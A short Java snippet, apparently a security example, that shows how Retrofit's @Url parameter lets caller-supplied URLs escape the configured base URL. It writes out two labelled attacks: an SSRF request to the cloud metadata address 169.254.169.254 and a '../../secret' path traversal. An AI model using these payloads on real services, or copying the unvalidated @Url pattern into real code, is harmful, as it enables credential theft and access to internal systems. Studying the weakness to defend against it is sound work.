// Configured Retrofit with base URL:
Retrofit retrofit = new Retrofit.Builder()
  .baseUrl("https://api.company.com/v1/")
  .build();

interface ApiService {
  @GET
  Call<ResponseBody> fetchData(@Url String url);
}

ApiService api = retrofit.create(ApiService.class);

// Attack 1: Absolute URL override - complete SSRF
// baseUrl.resolve("http://internal-metadata.service/latest/meta-data/")
// => http://internal-metadata.service/latest/meta-data/ (base completely ignored)
api.fetchData("http://169.254.169.254/latest/meta-data/").execute();

// Attack 2: Path traversal escaping base path
// baseUrl.resolve("../../secret") with base https://api.company.com/v1/
// => https://api.company.com/secret
api.fetchData("../../secret").execute();

